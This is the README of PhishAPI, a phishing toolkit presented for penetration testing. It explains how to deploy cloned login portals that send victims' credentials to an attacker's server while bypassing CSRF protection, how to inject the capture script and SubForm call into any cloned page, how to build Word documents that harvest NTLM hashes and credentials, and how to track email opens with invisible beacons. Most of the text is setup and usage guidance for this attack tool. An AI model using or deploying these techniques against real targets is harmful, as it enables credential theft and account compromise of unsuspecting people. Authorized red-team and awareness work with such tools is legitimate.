# PhishAPI
See my blog @ https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html for more details.  This API has three main features.  One allows you to easily deploy cloned landing pages for credential stealing, another is weaponized Word doc creation, and the third is saved email campaign templates.  Both attack methods are integrated into Slack for real-time alerting.  <b>Unfortunately, I'm no longer running this code as a free service @ https://phishapi.com due to cost, sorry!</b>


## Update

This latest version no longer redirects users of the landing pages to the API directly by default, but instead sends an AJAX request to the API server prior to posting the form data to the legitimate target site.  This provides for a more seamless experience for the "victim" and will actually log them into the target site when they submit their credentials, instead of performing what appears to be a refresh on the login page.  CSRF protection is bypassed by the API grabbing the token beforehand!  However, I haven't yet gotten around to updating all of the cloned portal pages to use this new method so many will still perform the redirect.  FYI!


<p align="center">
<img src="https://i.imgur.com/M6H7jfg.gif" width="60%"><br />
<b>Auto-Generate Fake Portal</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/4TeVrzE.gif" width="60%"><br />
<b>Create Word Maldoc</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/fDwFbHy.gif" width="60%"><br />
<b>Weaponize Existing Word Doc</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/xCMqAYc.gif" width="60%"><br />
<b>Create or Leverage Saved Email Campaigns</b>
<br/><br/></p>


# To Setup (Ubuntu/Debian) :

1) It's all in Docker now! Clone this repo (`git clone https://github.com/curtbraz/PhishAPI.git`), and `cd PhishAPI`. I typically host on an AWS EC2 Ubuntu instance or on WSL2 locally on Win 10 but you can host it anywhere.

2) Install docker-compose on Ubuntu with `sudo apt-get install docker-compose -y` and start Docker with `sudo systemctl start docker`.

3) For HTTPS (RECOMMENDED!), replace the certificate and key (keeping the filenames the same) in `/certs/ssl/` with yours (LetsEncrypt?) and update the domain (ServerName) in `000-default-le-ssl.conf`. Otherwise, skip this step but browsers will warn against POSTing to insecure sites.

4) Run docker-compose via `docker-compose build` from within the PhishAPI directory. Then, `docker-compose up -d`. (`docker-compose down` will kill it)

5) Optionally run Responder and BeEF in a screen session, but not required. (Coming soon to Docker!)

6) Visit your URL and configure your settings for notifications first. The Default User/Pass for basic auth is PhishAPI:PhishAPI for the config and reporting pages but I recommend changing this by editing `.htpasswd`. You should be good to go!



# 1) To Use the API for Capturing Credentials from Fake Sites : 

Rapid & Easy Deployment API for Phishing During Pentest Engagements.  Output to MySQL/Web Table &amp; Slack Bot.  Supports BEEF Hooking & HaveIBeenPwned!

<p align="center">
<img src="https://i.imgur.com/MKlHy2k.png" width="60%"><br />
<b>Figure 1: Choose "Fake Portal" From API Options</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/UfxzTHQ.png" width="80%"><br />
<b>Figure 2: Choose a Pre-Designed Generic Portal for Landing Page</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/V9GOCZ9.png" width="60%"><br />
<b>Figure 3: Fill Out API Details for Landing Page HTML and Optionally Include Your Own Logo</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/4MD7kq5.png" width="70%"><br />
<b>Figure 4: Download Automatically Created Source HTML to Host on a Standalone Server</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/E7ZLcam.png" width="90%"><br />
<b>Figure 5: The Hosted Site's Contents</b>
<br/><br/></p>

## OR

<b>If you don't wish to use a pre-populated landing page template or one doesn't exist that you would like to use, feel free to create or clone your own.  Simply : </b><br><br>

1) Add the external script source in the `<head>` element

	`<script src="https://YOUR_PHISHAPI_URL.com/APICredentialFormSubmit.js"></script>`

2) Change or add an "onclick" attribute to the submit button for the login form and fill out the arguments

	`<button onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">Submit!</button>`
	
	PhishAPI_URL_HERE = https://YOUR_PHISHAPI_URL.com (wherever you're hosting the API)<br />
	NAME/ID_OF_LOGIN_FORM = Whatever the cloned `<form name="">` is set to for the page you cloned<br />
	PROJECT_NAME = Self explanatory. The name of the org/client you're targeting (ex. Walmart)<br />
	SLACK_BOT_NAME = I use "PhishBot"<br />
	SLACK_EMOJI = I use `:fishing_pole_and_fish:`<br />
	USER_FIELD_NAME/ID = Name or ID of the username/email field (ID Preferred) (`<input name="username">` or `<input id="user">`)<br />
	PASS_FIELD_NAME/ID = Name or ID of the password field (ID Preferred) (`<input name="password">` or `<input id="pass">`)<br />
	SOURCE_URL_HERE = Original Address You Cloned the Site From (ex. https://TARGET_URL.com/logon.html)<br />
	CSRF_TOKEN_HERE = Leave blank unless the site you're cloning has a CSRF token.  If so provide the Name/ID here (`<input type="hidden" name="csrf_token" value="XDLKJSDLKJLDKJDLKJFSLKLSF">` so "csrf_token" is what you would use)

4) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials or click the link in the Slack notification.<br><br>

<p align="center">
<img src="https://i.imgur.com/L8yYRMQ.png" width="70%"><br />
<b>Figure 6: Someone Entered Credentials into the Fake Portal - Slack Alert</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/oXy9dEE.png" width="80%"><br />
<b>Figure 7: BeEF Hook Slack Alert (Optional in Case You Want to React Quickly w/ Modules)</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/CcSw4TT.png" width="100%"><br />
<b>Figure 8: Captured NTLMv2 Hash Exposed via Browser</b>
<br/><br/></p>

<p align="center">           
<img src="https://i.imgur.com/xdeSaWC.png"><br />
<b>Figure 9: Clicking the Slack Link Allows Viewing Credentials</b>
<br /><br/>
</p><br><br><br><br>

# 2) To Use the API for Generating Word Doc Payloads :

1) Create `/var/www/uploads` Path and `sudo chmod 777 /var/www/uploads -R` the path

3) Browse out to your hosted API (YOUR_URL.com) and select "Weaponized Documents" to generate your DOCX

4) Optionally set up [Responder](https://github.com/SpiderLabs/Responder "Responder") in a background process and run `phishinghashes.sh` every minute or so with cron

5) Set up your php.ini to allow uploads of at least 15MB and enable browscap.ini for parsing UserAgent strings, otherwise some functionality may be limited.  

6) Email your doc and wait for the Slack alerts!

<p align="center"><b>Bonus points if you use your docs as honeypot bait! :)</b></p>

<br /><br/>
<p align="center">
<img src="https://i.imgur.com/LW4BUjN.png"><br />
<b>Figure 1: Web Based Payload Generation - Create New Doc or Upload Existing w/ Payload Options</b>
</p>
                  
            
<br /><br/>
<p align="center">
<img src="https://i.imgur.com/onsPyFp.png"><br />
<b>Figure 2: Opening Document Generated (New) by Service</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/sw8JWQE.png" width="40%"><br />
<b>Figure 3: If "Auth Prompt" is Selected in Payload Options, Display Basic Auth Prompt to User for Credential Capturing (like Phishery)</b>
</p>
                  

<br /><br/>
<p align="center">
<img src="https://i.imgur.com/HlY3T4G.png" width="80%"><br />
<b>Figure 4: HTTP Beacon is Selected by Default and Alerts When the Target Opens the Document</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/ku6UTNI.png" width="75%"><br />
<b>Figure 5: If Credentials are Entered from Figure 3 Above, Notify via Slack When Captured</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/OO0sjDR.png"><br />
<b>Figure 6: Clicking on the Slack Alert Displays Captured Details (Hashes, Credentials, Client Details)</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/qZFGmXA.png"><br />
<b>Figure 7: Slack Alert when UNC/SMB Hashes are Received from Word Document</b>
</p>


<br /><br/>
<p align="center">
	<b>Currently, I'm running <a href="https://github.com/SpiderLabs/Responder">Responder</a> in a Screen session with <i>phishinghashes.sh</i> scheduled via Cron to run every minute to pick up hashes, correlate phished users, and alert via Slack.  You can also relay those hashes with another tool if you'd like to take things even further.  Enjoy! :)</b></p>




# 3) To Use the API to Store and Generate Email Campaign Templates : 

Leverage a template by creating or choosing an existing template from the local repository, or, you can compose a blank email and embed the invisible HTML beacon to be notified when the recipient opens their email.

<br />
<p align="center">
<img src="https://i.imgur.com/AmwZbbF.png"><br />
<b>Figure 1: Existing, New, or No Campaign Choices</b>
</p>


If a new campaign is chosen, you can create variables for dynamic re-use in the future and store them as HTML templates in a database.  The WYSIWYG editor makes things simple, but you can also copy and paste from a text editor or another source if you'd like!

<br />
<p align="center">
<img src="https://i.imgur.com/COHaq6q.png"><br />
<b>Figure 2: New Campaign w/ Variables & Images</b>
</p>


Next time, choosing the existing template will dynamically provide input fields for the stored variables.  They can be applied in real time using JavaScript to update the email body.  Checking the "Embed Notification for Opened Email" box will automatically append invisible code to your template that will alert you when your recipient opens their email.  (Images must be allowed to render for this to work)

<br />
<p align="center">
<img src="https://i.imgur.com/SsBAqKv.png" width="75%"><br />
<b>Figure 3: Existing Campaign</b>
</p>


Sit back and watch as your target opens their email and cross your fingers you later recieve another alert for BeEF, Maldocs, or your captured credentials!

<br />
<p align="center">
<img src="https://i.imgur.com/jJ5dGlRr.png"><br />
<b>Figure 4: Notification of Email Opened by Recipient</b>
</p>

<b>Enjoy! :)
